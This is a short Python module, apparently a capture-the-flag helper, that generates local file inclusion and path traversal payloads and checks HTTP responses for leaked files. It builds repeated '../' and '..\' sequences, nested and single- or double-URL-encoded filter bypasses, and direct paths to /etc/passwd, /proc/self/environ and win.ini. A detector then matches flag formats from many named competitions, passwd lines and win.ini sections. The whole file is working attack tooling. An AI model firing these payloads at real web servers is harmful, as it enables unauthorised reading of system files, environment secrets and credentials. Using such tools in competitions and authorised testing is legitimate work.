from __future__ import annotations

import re


def generate_traversal_payloads(target_file: str = "flag.txt", depth: int = 5) -> list[str]:
    """Generate comprehensive LFI and path traversal test payloads."""
    payloads: list[str] = [
        target_file,
        f"/{target_file}",
        f"//{target_file}",
    ]

    for d in range(1, depth + 1):
        # Standard ../
        dotdot = "../" * d + target_file
        payloads.append(dotdot)

        # Standard ..\
        dotdot_win = "..\\" * d + target_file
        payloads.append(dotdot_win)

        # Nested bypass ....//
        nested = "....//" * d + target_file
        payloads.append(nested)

        # URL encoded %2e%2e%2f
        url_enc = "%2e%2e%2f" * d + target_file
        payloads.append(url_enc)

        # Double URL encoded %252e%252e%252f
        double_url = "%252e%252e%252f" * d + target_file
        payloads.append(double_url)

    # Common absolute linux/windows paths
    payloads.extend([
        "/etc/passwd",
        "../../../../etc/passwd",
        "/proc/self/environ",
        "C:\\Windows\\win.ini",
        "../../../../Windows/win.ini",
    ])

    return list(dict.fromkeys(payloads))


def check_lfi_disclosure(content: str) -> dict[str, object]:
    """Analyze HTTP response text for indicators of local file inclusion."""
    flag_match = re.search(r"(?:TECHCOMFEST\d*|COMPFEST\d*|GEMASTIK\d*|WRECKIT\d*|HOLOGY\d*|SLASHROOT\d*|GETSFLAG|CTFLEARN|picoCTF|SEKAI|HIDC\d*|ARA\d*|CHTB|HTB|THM|ASIS|DICE|HOPE|OOO|ARKAV|LACTF|ACTF|LKS|CTF|FLAG|CT)\{[^}]+\}", content, re.IGNORECASE)
    has_passwd = bool(re.search(r"root:[x*]:0:0:", content))
    has_win_ini = bool(re.search(r"\[(?:fonts|extensions|files)\]", content, re.IGNORECASE))

    return {
        "disclosed": bool(flag_match or has_passwd or has_win_ini),
        "flag": flag_match.group(0) if flag_match else None,
        "is_passwd": has_passwd,
        "is_win_ini": has_win_ini,
    }
